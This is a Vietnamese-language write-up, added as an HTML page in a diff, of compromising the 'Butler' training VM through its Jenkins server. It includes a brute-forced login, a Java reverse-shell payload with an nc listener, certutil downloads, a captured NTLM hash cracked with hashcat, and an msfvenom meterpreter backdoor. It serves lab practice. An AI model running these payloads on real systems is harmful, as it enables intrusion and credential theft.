@@ -1,0 +1,467 @@
+
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Butler TCM - writeup</title>
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+        <link href="https://cdn.jsdelivr.net/npm/lightgallery.js/dist/css/lightgallery.min.css" rel="stylesheet">
+        <link href="https://cdn.jsdelivr.net/npm/lg-thumbnail.js/dist/lg-thumbnail.min.css" rel="stylesheet">
+        <!-- Add Pygments CSS for code highlighting -->
+        <style>pre { line-height: 125%; }
+td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+.highlight .hll { background-color: #ffffcc }
+.highlight { background: #f8f8f8; }
+.highlight .c { color: #3D7B7B; font-style: italic } /* Comment */
+.highlight .err { border: 1px solid #FF0000 } /* Error */
+.highlight .k { color: #008000; font-weight: bold } /* Keyword */
+.highlight .o { color: #666666 } /* Operator */
+.highlight .ch { color: #3D7B7B; font-style: italic } /* Comment.Hashbang */
+.highlight .cm { color: #3D7B7B; font-style: italic } /* Comment.Multiline */
+.highlight .cp { color: #9C6500 } /* Comment.Preproc */
+.highlight .cpf { color: #3D7B7B; font-style: italic } /* Comment.PreprocFile */
+.highlight .c1 { color: #3D7B7B; font-style: italic } /* Comment.Single */
+.highlight .cs { color: #3D7B7B; font-style: italic } /* Comment.Special */
+.highlight .gd { color: #A00000 } /* Generic.Deleted */
+.highlight .ge { font-style: italic } /* Generic.Emph */
+.highlight .gr { color: #E40000 } /* Generic.Error */
+.highlight .gh { color: #000080; font-weight: bold } /* Generic.Heading */
+.highlight .gi { color: #008400 } /* Generic.Inserted */
+.highlight .go { color: #717171 } /* Generic.Output */
+.highlight .gp { color: #000080; font-weight: bold } /* Generic.Prompt */
+.highlight .gs { font-weight: bold } /* Generic.Strong */
+.highlight .gu { color: #800080; font-weight: bold } /* Generic.Subheading */
+.highlight .gt { color: #0044DD } /* Generic.Traceback */
+.highlight .kc { color: #008000; font-weight: bold } /* Keyword.Constant */
+.highlight .kd { color: #008000; font-weight: bold } /* Keyword.Declaration */
+.highlight .kn { color: #008000; font-weight: bold } /* Keyword.Namespace */
+.highlight .kp { color: #008000 } /* Keyword.Pseudo */
+.highlight .kr { color: #008000; font-weight: bold } /* Keyword.Reserved */
+.highlight .kt { color: #B00040 } /* Keyword.Type */
+.highlight .m { color: #666666 } /* Literal.Number */
+.highlight .s { color: #BA2121 } /* Literal.String */
+.highlight .na { color: #687822 } /* Name.Attribute */
+.highlight .nb { color: #008000 } /* Name.Builtin */
+.highlight .nc { color: #0000FF; font-weight: bold } /* Name.Class */
+.highlight .no { color: #880000 } /* Name.Constant */
+.highlight .nd { color: #AA22FF } /* Name.Decorator */
+.highlight .ni { color: #717171; font-weight: bold } /* Name.Entity */
+.highlight .ne { color: #CB3F38; font-weight: bold } /* Name.Exception */
+.highlight .nf { color: #0000FF } /* Name.Function */
+.highlight .nl { color: #767600 } /* Name.Label */
+.highlight .nn { color: #0000FF; font-weight: bold } /* Name.Namespace */
+.highlight .nt { color: #008000; font-weight: bold } /* Name.Tag */
+.highlight .nv { color: #19177C } /* Name.Variable */
+.highlight .ow { color: #AA22FF; font-weight: bold } /* Operator.Word */
+.highlight .w { color: #bbbbbb } /* Text.Whitespace */
+.highlight .mb { color: #666666 } /* Literal.Number.Bin */
+.highlight .mf { color: #666666 } /* Literal.Number.Float */
+.highlight .mh { color: #666666 } /* Literal.Number.Hex */
+.highlight .mi { color: #666666 } /* Literal.Number.Integer */
+.highlight .mo { color: #666666 } /* Literal.Number.Oct */
+.highlight .sa { color: #BA2121 } /* Literal.String.Affix */
+.highlight .sb { color: #BA2121 } /* Literal.String.Backtick */
+.highlight .sc { color: #BA2121 } /* Literal.String.Char */
+.highlight .dl { color: #BA2121 } /* Literal.String.Delimiter */
+.highlight .sd { color: #BA2121; font-style: italic } /* Literal.String.Doc */
+.highlight .s2 { color: #BA2121 } /* Literal.String.Double */
+.highlight .se { color: #AA5D1F; font-weight: bold } /* Literal.String.Escape */
+.highlight .sh { color: #BA2121 } /* Literal.String.Heredoc */
+.highlight .si { color: #A45A77; font-weight: bold } /* Literal.String.Interpol */
+.highlight .sx { color: #008000 } /* Literal.String.Other */
+.highlight .sr { color: #A45A77 } /* Literal.String.Regex */
+.highlight .s1 { color: #BA2121 } /* Literal.String.Single */
+.highlight .ss { color: #19177C } /* Literal.String.Symbol */
+.highlight .bp { color: #008000 } /* Name.Builtin.Pseudo */
+.highlight .fm { color: #0000FF } /* Name.Function.Magic */
+.highlight .vc { color: #19177C } /* Name.Variable.Class */
+.highlight .vg { color: #19177C } /* Name.Variable.Global */
+.highlight .vi { color: #19177C } /* Name.Variable.Instance */
+.highlight .vm { color: #19177C } /* Name.Variable.Magic */
+.highlight .il { color: #666666 } /* Literal.Number.Integer.Long */</style>
+        <style>
+            /* Center the HTML file on the screen */
+            body {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                padding-top: 30px;
+            }
+            /* Make the display width of the HTML file smaller */
+            .container {
+                max-width: 42vw;
+                margin: 0 auto;
+                height: 100%
+            }
+            
+            img {
+                width: 80%;
+            }
+        </style>
+        <script src="https://cdn.jsdelivr.net/npm/lightgallery.js/dist/js/lightgallery.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js/dist/lg-thumbnail.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-zoom.js/dist/lg-zoom.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-fullscreen.js/dist/lg-fullscreen.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-share.js/dist/lg-share.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-autoplay.js/dist/lg-autoplay.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-rotate.js/dist/lg-rotate.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-flip.js/dist/lg-flip.min.js"></script>
+        <script>
+            window.onload = function() {
+                const images = document.getElementsByTagName('img');
+                const lightGalleryItems = [];
+                for (let i = 0; i < images.length; i++) {
+                    const img = images[i];
+                    if (img.naturalWidth > 1000) {
+                        if (window.innerWidth > 768) {
+                            img.style.width = '110%';
+                            img.style.transform = 'translateX(-4%)';
+                        } else {
+                            img.style.width = '100%';
+                            img.style.transform = 'none';
+                        }
+                    }
+                    lightGalleryItems.push({ src: img.src, thumb: img.src });
+                    img.setAttribute('data-lg-idx', i);
+                    img.addEventListener('click', function() {
+                        lightGallery(img, {
+                            dynamic: true,
+                            dynamicEl: lightGalleryItems,
+                            index: parseInt(img.getAttribute('data-lg-idx'))
+                        });
+                    });
+                }
+            };
+        </script>
+    </head>
+    <body>
+        <div class="container">
+            <div class="row">
+                <div class="col">
+                    <h1 style="text-align:center; text-transform:uppercase; font-family: 'Playfair Display', serif; font-weight:700;"">Butler</h1>
+
+<p>Tuesday, August 2, 2022</p>
+<p>11:00 PM</p>
+<p>$ nmap -A -p- -T4 192.168.44.145</p>
+<p>Starting Nmap 7.91 (  ) at 2022-08-03 10:45 EDT</p>
+<p>Nmap scan report for 192.168.44.145 (192.168.44.145)</p>
+<p>Host is up (0.00015s latency).</p>
+<p>Not shown: 65523 closed ports</p>
+<p>PORT      STATE SERVICE       VERSION</p>
+<p>135/tcp   open  msrpc         Microsoft Windows RPC</p>
+<p>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</p>
+<p>445/tcp   open  microsoft-ds?</p>
+<p>5040/tcp  open  unknown</p>
+<p>7680/tcp  open  pando-pub?</p>
+<p>8080/tcp  open  http          Jetty 9.4.41.v20210516</p>
+<p>| http-robots.txt: 1 disallowed entry</p>
+<p>|_/</p>
+<p>|_http-server-header: Jetty(9.4.41.v20210516)</p>
+<p>|_http-title: Site doesn't have a title (text/html;charset=utf-8).</p>
+<p>49664/tcp open  msrpc         Microsoft Windows RPC</p>
+<p>49665/tcp open  msrpc         Microsoft Windows RPC</p>
+<p>49666/tcp open  msrpc         Microsoft Windows RPC</p>
+<p>49667/tcp open  msrpc         Microsoft Windows RPC</p>
+<p>49668/tcp open  msrpc         Microsoft Windows RPC</p>
+<p>49669/tcp open  msrpc         Microsoft Windows RPC</p>
+<p>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</p>
+<p>Host script results:</p>
+<p>|_clock-skew: 13h59m58s</p>
+<p>|_nbstat: NetBIOS name: BUTLER, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:31:83:b8 (VMware)</p>
+<p>| smb2-security-mode:</p>
+<p>|   2.02:</p>
+<p>|_    Message signing enabled but not required</p>
+<p>| smb2-time:</p>
+<p>|   date: 2022-08-04T04:49:38</p>
+<p>|_  start_date: N/A</p>
+<p>Service detection performed. Please report any incorrect results at  .</p>
+<p>Nmap done: 1 IP address (1 host up) scanned in 288.07 seconds</p>
+<p>Thử telnet nhưng không có gì</p>
+<p>┌──(kali㉿kali)-[~/Desktop]</p>
+<p>└─$ telnet 192.168.44.145  7680</p>
+<p>Trying 192.168.44.145...</p>
+<p>Connected to 192.168.44.145.</p>
+<p>Escape character is '^]'.</p>
+<p>quit</p>
+<p>exit</p>
+<p>Connection closed by foreign host.</p>
+<p>Vào trang chủ jenkins, đăng nhập bằng tài khoản mặc định nhưng không thành công</p>
+<p>Bruteforce bằng burpsuite</p>
+<p><img alt="" src="../media/Butler%20TCM%20-%20writeup_1.png" /></p>
+<p>Đặt payload như sau</p>
+<p><img alt="" src="../media/Butler%20TCM%20-%20writeup_2.png" /></p>
+<p><img alt="" src="../media/Butler%20TCM%20-%20writeup_3.png" /></p>
+<p>Kết quả như sau</p>
+<p><img alt="" src="../media/Butler%20TCM%20-%20writeup_4.png" /></p>
+<p>Đăng nhập vào jenkins và lấy reverse shell bằng payload sau:</p>
+<p>String host="localhost";</p>
+<p>int port=8044;</p>
+<p>String cmd="cmd.exe";</p>
+<p>Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</p>
+<p>Trên máy tấn công bật nc trước:</p>
+<p>nc -nvlp 443</p>
+<p>listening on [any] 443 ...</p>
+<p>connect to [192.168.44.128] from (UNKNOWN) [192.168.44.145] 50064</p>
+<p>Microsoft Windows [Version 10.0.19043.928]</p>
+<p>(c) Microsoft Corporation. All rights reserved.</p>
+<p>C:\Program Files\Jenkins&gt;whoami</p>
+<p>whoami</p>
+<p>butler\butler</p>
+<p>C:\Program Files\Jenkins&gt;systeminfo</p>
+<p>systeminfo</p>
+<p>Host Name:                 BUTLER</p>
+<p>OS Name:                   Microsoft Windows 10 Enterprise Evaluation</p>
+<p>OS Version:                10.0.19043 N/A Build 19043</p>
+<p>OS Manufacturer:           Microsoft Corporation</p>
+<p>OS Configuration:          Standalone Workstation</p>
+<p>OS Build Type:             Multiprocessor Free</p>
+<p>Registered Owner:          butler</p>
+<p>Registered Organization:</p>
+<p>Product ID:                00329-20000-00001-AA079</p>
+<p>Original Install Date:     8/14/2021, 3:51:38 AM</p>
+<p>System Boot Time:          8/3/2022, 9:37:43 PM</p>
+<p>System Manufacturer:       VMware, Inc.</p>
+<p>System Model:              VMware7,1</p>
+<p>System Type:               x64-based PC</p>
+<p>Processor(s):              3 Processor(s) Installed.</p>
+<p><a href="192.168.44.145">01</a>: AMD64 Family 25 Model 80 Stepping 0 AuthenticAMD ~3194 Mhz</p>
+<p><a href="fe80::d84f:eb80:5807:1704">02</a>: AMD64 Family 25 Model 80 Stepping 0 AuthenticAMD ~3194 Mhz</p>
+<p><a href="KB5000736">03</a>: AMD64 Family 25 Model 80 Stepping 0 AuthenticAMD ~3194 Mhz</p>
+<p>BIOS Version:              VMware, Inc. VMW71.00V.18452719.B64.2108091906, 8/9/2021</p>
+<p>Windows Directory:         C:\Windows</p>
+<p>System Directory:          C:\Windows\system32</p>
+<p>Boot Device:               \Device\HarddiskVolume1</p>
+<p>System Locale:             en-us;English (United States)</p>
+<p>Input Locale:              en-us;English (United States)</p>
+<p>Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)</p>
+<p>Total Physical Memory:     4,095 MB</p>
+<p>Available Physical Memory: 2,151 MB</p>
+<p>Virtual Memory: Max Size:  5,503 MB</p>
+<p>Virtual Memory: Available: 3,526 MB</p>
+<p>Virtual Memory: In Use:    1,977 MB</p>
+<p>Page File Location(s):     C:\pagefile.sys</p>
+<p>Domain:                    WORKGROUP</p>
+<p>Logon Server:              N/A</p>
+<p>Hotfix(s):                 6 Hotfix(s) Installed.</p>
+<p>Network Card(s):           1 NIC(s) Installed.</p>
+<p><a href="192.168.44.145">01</a>: Intel(R) 82574L Gigabit Network Connection</p>
+<p>Connection Name: Ethernet0</p>
+<p>DHCP Enabled:    Yes</p>
+<p>DHCP Server:     192.168.44.254</p>
+<p>IP address(es)</p>
+<p>Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.</p>
+<p>Copy winpeas</p>
+<p>C:\Program Files\Jenkins&gt; certutil -urlcache -f  winpeas.exe</p>
+<p>certutil -urlcache -f  winpeas.exe</p>
+<p><strong><em>*  Online  </em></strong>*</p>
+<p>CertUtil: -URLCache command completed successfully.</p>
+<p>Chạy winpeas Thu được thông tin sau</p>
+<p>butler::BUTLER:1122334455667788:1ac7ac3cb6c51764c9934d0d84f26279:0101000000000000d7d869814ca7d801d307dab2c5d47645000000000800300030000000000000000000000000300000ac6c3b895a9cb2e9e681a55396942e27f2f193caaa7caa1f0a48ca3d7000df420a00100000000000000000000000000000000000090000000000000000000000</p>
+<p>hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</p>
+<p>Tạo backdoor:</p>
+<p>msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=192.168.44.128 LPORT=4445  -f exe &gt; wise.exe</p>
+<p>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</p>
+<p>[-] No arch selected, selecting arch: x64 from the payload</p>
+<p>No encoder specified, outputting raw payload</p>
+<p>Payload size: 510 bytes</p>
+<p>Final size of exe file: 7168 bytes</p>
+<p>Tải backdoor:</p>
+<p>certutil -urlcache -f  wise.exe</p>
+                </div>
+            </div>
+        </div>    
+    </body>
+    </html>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+<style>
+
+.copy-button {
+  position: absolute;
+  right: 5px ;
+  top: 5px;
+  border: transparent;
+  background-color: transparent;
+  padding: 2px 6px;
+  cursor: pointer;
+  font-size: 14px;
+  color: #333;
+  border-radius: 8px;
+
+}
+
+.copy-button:hover {
+  background-color: #30363d; # Change this to a different color to create a hover effect
+}
+.material-icons{
+  line-height:1.3;
+  color: #7d8590;
+}
+
+pre {
+  position: relative;
+  # padding: 20px;
+  border: 1px solid #e7ee7;
+  overflow-x: auto; # Remove this line to disable horizontal scrolling
+  font-size: 14px;
+  line-height: 1.5;
+  border-radius: 6px;
+  margin-bottom: 20px;
+
+  # Add these lines to set a fixed width for the code block and wrap long lines
+  #width: 80%;
+  white-space: pre-wrap; 
+}
+
+pre code {
+  display: block;
+  border-radius: 8px;
+  background-color: #2d2d2d; # Change this to a different color to match the copy button background
+
+}
+
+
+
+
+@media only screen and (min-width: 280px) {
+  img {
+    width: 85%; /* Make image smaller on tablets and mobiles */
+  }
+}
+
+@media only screen and (max-width: 768px) {
+  img {
+    width: 85%; /* Make image smaller on tablets and desktops */
+  }
+}
+
+# @media (min-width: 576px) {
+#   img {
+#     max-width: 540px;
+#   }
+# }
+
+# @media (min-width: 768px) {
+#   img {
+#     max-width: 720px;
+#   }
+# }
+
+
+
+@media (min-width: 280px) {
+  .container {
+    max-width: 90%;
+    margin: 0 auto;
+    height: 100%;
+  }
+}
+
+@media (min-width: 750px) {
+  .container {
+    max-width: 80%;
+    margin: 0 auto;
+    height: 100%;
+  }
+}
+
+
+
+@media (min-width: 912px) {
+  .container {
+    max-width: 70%;
+    margin: 0 auto;
+    height: 100%;
+  }
+}
+
+# @media (min-width: 1200px) {
+#   .container {
+#     max-width: 70%;
+#     margin: 0 auto;
+#     height: 100%;
+#   }
+# }
+
+# @media (min-width: 576px) {
+#   .container {
+#     max-width: 540px;
+#   }
+# }
+
+# @media (min-width: 768px) {
+#   .container {
+#     max-width: 620px;
+#     margin: 0;
+#   }
+# }
+
+# @media (min-width: 992px) {
+#   .container {
+#     max-width: 760px;
+#   }
+# }
+
+@media (min-width: 1200px) {
+  .container {
+    max-width: 735px;
+    margin: 0;
+    height: 100%;
+  }
+}
+
+# p { 
+#   text-indent: 10px;
+# }
+
+h2 {
+  font-size: 1.5rem;
+}
+
+h3 {
+  font-size: 1.3rem;
+}
+
+# .container {
+#   max-width: 100%; /* Set the container width to 100% */
+#   padding-left: 15px; /* Add some padding to the left */
+#   padding-right: 15px; /* Add some padding to the right */
+# }
+
+
+</style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.7.2/highlight.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark-reasonable.min.css">
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    var codeBlocks = document.querySelectorAll('pre code');
+    codeBlocks.forEach(function(codeBlock) {
+      var copyButton = document.createElement('button');
+      copyButton.innerHTML = '<i class="material-icons">content_copy</i>';
+      copyButton.classList.add('copy-button');
+      codeBlock.parentNode.insertBefore(copyButton, codeBlock);
+
+      copyButton.addEventListener('click', function() {
+        var code = codeBlock.textContent;
+        var textarea = document.createElement('textarea');
+        textarea.textContent = code;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        textarea.remove();
+        copyButton.innerHTML = '<i class="material-icons">check</i>';
+        setTimeout(function() {
+          copyButton.innerHTML = '<i class="material-icons">content_copy</i>';
+        }, 2000);
+      });
+    });
+
+    // Initialize highlight.js for syntax highlighting
+    hljs.initHighlightingOnLoad();
+  });
+</script>
